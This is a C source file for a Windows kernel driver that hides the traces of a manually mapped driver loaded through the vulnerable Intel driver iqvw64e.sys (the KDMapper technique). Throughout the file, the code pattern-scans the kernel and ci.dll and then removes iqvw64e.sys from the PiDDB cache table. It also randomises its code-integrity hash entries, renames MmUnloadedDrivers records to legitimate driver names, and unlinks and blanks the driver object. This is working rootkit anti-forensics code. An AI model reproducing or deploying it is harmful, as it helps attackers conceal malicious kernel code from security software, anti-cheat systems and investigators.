#include "cleaner.h"

static const BYTE PiDDBLockPattern[] = {
    0x48, 0x8D, 0x0D, 0xCC, 0xCC, 0xCC, 0xCC,
    0xE8, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0x0D, 0xCC, 0xCC, 0xCC, 0xCC,
    0x33, 0xDB
};

static const BYTE MmUnloadedDriversPattern[] = {
    0x4C, 0x8B, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8B, 0xC9,
    0x4D, 0x85, 0xCC,
    0x74
};

// 21H1
static const BYTE KernelHashBucketPattern1[] = {
    0x4C, 0x8D, 0x35, 0xCC, 0xCC, 0xCC, 0xCC,
    0xE9, 0xCC, 0xCC, 0xCC, 0xCC,
    0x8B, 0x84, 0x24
};

// 22H2
static const BYTE KernelHashBucketPattern2[] = {
    0x48, 0x8B, 0x1D, 0xCC, 0xCC, 0xCC, 0xCC,
    0xEB, 0xCC,
    0xF7, 0x43, 0x40, 0x00, 0x20, 0x00, 0x00
};

PVOID GetKernelModuleBase(const char* moduleName)
{
    ULONG bytes = 0;
    NTSTATUS status = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &bytes);
    if (!bytes) return NULL;

    PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(NonPagedPool, bytes, 'MODS');
    if (!modules) return NULL;

    status = ZwQuerySystemInformation(SystemModuleInformation, modules, bytes, &bytes);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(modules, 'MODS');
        return NULL;
    }

    PVOID result = NULL;
    for (ULONG i = 0; i < modules->NumberOfModules; i++) {
        char* name = (char*)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;
        // Simple case-insensitive match
        if (_stricmp(name, moduleName) == 0) {
            result = modules->Modules[i].ImageBase;
            break;
        }
    }

    ExFreePoolWithTag(modules, 'MODS');
    return result;
}

PVOID ResolveRelativeAddress(PVOID instruction, ULONG offsetToRip, ULONG instructionSize)
{
    LONG relativeOffset = *(PLONG)((PUCHAR)instruction + offsetToRip);
    return (PVOID)((PUCHAR)instruction + instructionSize + relativeOffset);
}

PVOID FindPattern(PVOID baseAddress, ULONG size, const BYTE* pattern, SIZE_T patternSize)
{
    for (ULONG i = 0; i < size - patternSize; i++) {
        BOOLEAN found = TRUE;
        for (SIZE_T j = 0; j < patternSize; j++) {
            if (pattern[j] != 0xCC && ((PUCHAR)baseAddress)[i + j] != pattern[j]) {
                found = FALSE;
                break;
            }
        }
        if (found)
            return (PVOID)((PUCHAR)baseAddress + i);
    }
    return NULL;
}

PVOID GetPageSection(PULONG outSize)
{
    if (!g_KernelBase)
        return NULL;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)g_KernelBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)g_KernelBase + dosHeader->e_lfanew);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (USHORT i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, "PAGE", 4) == 0) {
            if (outSize)
                *outSize = section[i].Misc.VirtualSize;
            return (PVOID)((PUCHAR)g_KernelBase + section[i].VirtualAddress);
        }
    }

    return NULL;
}

BOOLEAN CleanPiDDBCacheTable()
{
    ULONG pageSize = 0;
    PVOID pageSection = GetPageSection(&pageSize);
    if (!pageSection)
        return FALSE;

    PVOID lockPattern = FindPattern(pageSection, pageSize, PiDDBLockPattern, sizeof(PiDDBLockPattern));
    if (!lockPattern)
        return FALSE;

    PVOID* pPiDDBLock = (PVOID*)ResolveRelativeAddress(lockPattern, 3, 7);
    PVOID* pPiDDBCacheTable = (PVOID*)ResolveRelativeAddress((PVOID)((PUCHAR)lockPattern + 14), 3, 7);

    if (!pPiDDBLock || !pPiDDBCacheTable)
        return FALSE;

    // CRITICAL: Validate resolved addresses before using them
    if (!MmIsAddressValid(pPiDDBLock) || !MmIsAddressValid(pPiDDBCacheTable))
        return FALSE;

    DBG_PRINT("PiDDBLock: %p, PiDDBCacheTable: %p", pPiDDBLock, pPiDDBCacheTable);

    PIDCacheobj lookupEntry = {0};
    RtlInitUnicodeString(&lookupEntry.DriverName, L"iqvw64e.sys");
    lookupEntry.TimeDateStamp = 0x5284EAC3;

    __try {
        ExAcquireResourceExclusiveLite((PERESOURCE)pPiDDBLock, TRUE);

        PPIDCacheobj foundEntry = (PPIDCacheobj)RtlLookupElementGenericTableAvl(
            (PRTL_AVL_TABLE)pPiDDBCacheTable,
            &lookupEntry
        );

        if (foundEntry) {
            RemoveEntryList(&foundEntry->List);
            RtlDeleteElementGenericTableAvl((PRTL_AVL_TABLE)pPiDDBCacheTable, foundEntry);
            DBG_PRINT("Removed iqvw64e.sys from PiDDB");
        }

        ExReleaseResourceLite((PERESOURCE)pPiDDBLock);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        DBG_PRINT("EXCEPTION in PiDDB cleanup");
        return FALSE;
    }

    return TRUE;
}

BOOLEAN CleanKernelHashBucket(const wchar_t* driverName)
{
    PVOID ciBase = GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        DBG_PRINT("Failed to get ci.dll base");
        return FALSE;
    }

    PIMAGE_NT_HEADERS ntHeaders = RtlImageNtHeader(ciBase);
    if (!ntHeaders) return FALSE;
    
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    ULONG size = 0;
    PVOID sectionBase = NULL;

    for (USHORT i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            sectionBase = (PVOID)((PUCHAR)ciBase + section[i].VirtualAddress);
            size = section[i].Misc.VirtualSize;
            break;
        }
    }

    if (!sectionBase) return FALSE;

    PVOID pattern = FindPattern(sectionBase, size, KernelHashBucketPattern1, sizeof(KernelHashBucketPattern1));
    if (!pattern) {
        pattern = FindPattern(sectionBase, size, KernelHashBucketPattern2, sizeof(KernelHashBucketPattern2));
    }

    if (!pattern) {
        DBG_PRINT("HashBucket pattern not found");
        return FALSE;
    }

    ULONGLONG* g_KernelHashBucketList = (ULONGLONG*)ResolveRelativeAddress(pattern, 3, 7);
    if (!g_KernelHashBucketList) return FALSE;

    DBG_PRINT("g_KernelHashBucketList: %p", g_KernelHashBucketList);

    UNICODE_STRING targetName;
    RtlInitUnicodeString(&targetName, driverName);

    LARGE_INTEGER time;
    // KeQuerySystemTime(&time);
    time.QuadPart = __rdtsc();

    BOOLEAN cleaned = FALSE;

    // Traverse the list
    // Note: The list structure is not exactly a standard LIST_ENTRY based on 64KernelDriverCleaner
    // It uses a custom next pointer at the beginning.
    
    for (ULONGLONG i = *g_KernelHashBucketList; i; ) {
        // Validate each node before accessing
        if (!MmIsAddressValid((PVOID)i)) {
            DBG_PRINT("Invalid HashBucket node at %p, stopping traversal", (PVOID)i);
            break;
        }

        PWCH wsName = (PWCH)(i + 0x48);
        
        // Validate the name pointer before reading
        if (!MmIsAddressValid(wsName)) {
            i = *(ULONGLONG*)i;
            continue;
        }
        
        __try {
            if (wcsstr(wsName, targetName.Buffer)) {
                 DBG_PRINT("Found HashBucket entry for %ws", targetName.Buffer);
                 
                 PUCHAR hash = (PUCHAR)(i + 0x18);
                 if (MmIsAddressValid(hash)) {
                     for (int j = 0; j < 20; j++) {
                         hash[j] = (UCHAR)(RtlRandomEx(&time.LowPart) % 255);
                     }
                     cleaned = TRUE;
                     DBG_PRINT("Randomized hash for %ws", targetName.Buffer);
                 }
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            DBG_PRINT("Exception accessing HashBucket entry at %p", (PVOID)i);
        }

        i = *(ULONGLONG*)i;
    }

    return cleaned;
}

BOOLEAN CleanMmUnloadedDrivers(const wchar_t* driverName)
{
    ULONG pageSize = 0;
    PVOID pageSection = GetPageSection(&pageSize);
    if (!pageSection)
        return FALSE;

    PVOID pattern = FindPattern(pageSection, pageSize, MmUnloadedDriversPattern, sizeof(MmUnloadedDriversPattern));
    if (!pattern)
        return FALSE;

    PMM_UNLOADED_DRIVER* pMmUnloadedDrivers = (PMM_UNLOADED_DRIVER*)ResolveRelativeAddress(pattern, 3, 7);
    if (!pMmUnloadedDrivers)
        return FALSE;

    DBG_PRINT("MmUnloadedDrivers: %p", pMmUnloadedDrivers);

    PMM_UNLOADED_DRIVER entry = *pMmUnloadedDrivers;
    UNICODE_STRING targetName;
    RtlInitUnicodeString(&targetName, driverName);

    // List of legit drivers to spoof
    const wchar_t* legitDrivers[] = {
        L"nvlddmkm.sys", L"amdgpu.sys", L"intelppm.sys",
        L"storport.sys", L"ksecdd.sys", L"tcpip.sys"
    };
    
    LARGE_INTEGER seed;
    // KeQuerySystemTime(&seed);
    seed.QuadPart = __rdtsc();

    for (int i = 0; i < 50; i++) {
        __try {
            if (!MmIsAddressValid(&entry[i]))
                break;

            if (entry[i].Name.Buffer && MmIsAddressValid(entry[i].Name.Buffer)) {
                // Check for our driver OR the vulnerable driver (iqvw64e.sys)
                if (wcsstr(entry[i].Name.Buffer, targetName.Buffer) || 
                    wcsstr(entry[i].Name.Buffer, L"iqvw64e") || 
                    wcsstr(entry[i].Name.Buffer, L"Iqvw64e")) {
                    
                    DBG_PRINT("Found MmUnloadedDrivers entry: %ws", entry[i].Name.Buffer);

                    // Randomly select a legit driver name
                    ULONG randomIndex = (seed.LowPart ^ i) % (sizeof(legitDrivers)/sizeof(legitDrivers[0]));
                    UNICODE_STRING newName;
                    RtlInitUnicodeString(&newName, legitDrivers[randomIndex]);

                    // Guard ExFreePool with validity check
                    if (MmIsAddressValid(entry[i].Name.Buffer)) {
                        ExFreePool(entry[i].Name.Buffer);
                    }
                    
                    entry[i].Name.Buffer = (PWCH)ExAllocatePoolWithTag(NonPagedPool, newName.MaximumLength, 'MMUD');
                    if (entry[i].Name.Buffer) {
                        RtlCopyMemory(entry[i].Name.Buffer, newName.Buffer, newName.Length);
                        entry[i].Name.Length = newName.Length;
                        entry[i].Name.MaximumLength = newName.MaximumLength;
                    }

                    // Randomize timestamps
                    entry[i].UnloadTime = seed.QuadPart;
                    
                    DBG_PRINT("Spoofed MmUnloadedDrivers entry to %ws", legitDrivers[randomIndex]);
                }
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            DBG_PRINT("Exception in MmUnloadedDrivers entry %d", i);
            continue;
        }
    }

    return TRUE;
}

VOID HideDriverObject(PDRIVER_OBJECT DriverObject)
{
    if (!DriverObject || !MmIsAddressValid(DriverObject))
        return;

    __try {
        // Clear driver name
        if (DriverObject->DriverName.Buffer && MmIsAddressValid(DriverObject->DriverName.Buffer)) {
            RtlZeroMemory(DriverObject->DriverName.Buffer, DriverObject->DriverName.Length);
            DriverObject->DriverName.Length = 0;
            DriverObject->DriverName.MaximumLength = 0;
        }

        // Unlink from load order list
        PLDR_DATA_TABLE_ENTRY_KM ldrEntry = (PLDR_DATA_TABLE_ENTRY_KM)DriverObject->DriverSection;
        if (ldrEntry && MmIsAddressValid(ldrEntry)) {
            if (ldrEntry->InLoadOrderLinks.Flink && MmIsAddressValid(ldrEntry->InLoadOrderLinks.Flink) &&
                ldrEntry->InLoadOrderLinks.Blink && MmIsAddressValid(ldrEntry->InLoadOrderLinks.Blink)) {
                RemoveEntryList(&ldrEntry->InLoadOrderLinks);
                ldrEntry->InLoadOrderLinks.Flink = NULL;
                ldrEntry->InLoadOrderLinks.Blink = NULL;
            }
        }

        // Erase PE headers (skip for manually mapped drivers - KDMapper may have already done this)
        // This is the most common BSOD cause with KDMapper
        /*
        if (DriverObject->DriverStart && MmIsAddressValid(DriverObject->DriverStart)) {
            PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)DriverObject->DriverStart;
            if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
                PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)DriverObject->DriverStart + dosHeader->e_lfanew);
                if (MmIsAddressValid(ntHeaders) && ntHeaders->Signature == IMAGE_NT_SIGNATURE) {
                    ULONG headerSize = ntHeaders->OptionalHeader.SizeOfHeaders;
                    RtlZeroMemory(DriverObject->DriverStart, headerSize);
                    DBG_PRINT("Erased PE headers (%u bytes)", headerSize);
                }
            }
        }
        */

        DriverObject->DriverSection = NULL;
        DriverObject->DriverInit = NULL;
        // Don't null DriverStart - our code is still running from there!
        // DriverObject->DriverStart = NULL;
        DriverObject->DriverSize = 0;

        for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
            DriverObject->MajorFunction[i] = NULL;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        DBG_PRINT("EXCEPTION in HideDriverObject internals");
    }

    DBG_PRINT("Driver object hidden");
}

VOID CleanAllTraces(PDRIVER_OBJECT DriverObject)
{
    DBG_PRINT("Starting trace cleanup");

    if (!CleanPiDDBCacheTable()) {
        DBG_PRINT("Failed to clean PiDDB (non-fatal)");
    }

    if (!CleanMmUnloadedDrivers(L"iqvw64e.sys")) {
        DBG_PRINT("Failed to clean MmUnloadedDrivers (non-fatal)");
    }
    
    // Also clean our own driver if we had a name (but we are manually mapped, so we might not be there)
    // If we want to clean specific traces, we call it.
    
    // Clean HashBucket
    // Note: iqvw64e.sys is the one likely in the hash bucket if it was loaded regularly.
    if (!CleanKernelHashBucket(L"iqvw64e.sys")) {
        DBG_PRINT("Failed to clean HashBucket (non-fatal or not found)");
    }

    HideDriverObject(DriverObject);

    DBG_PRINT("Trace cleanup complete");
}
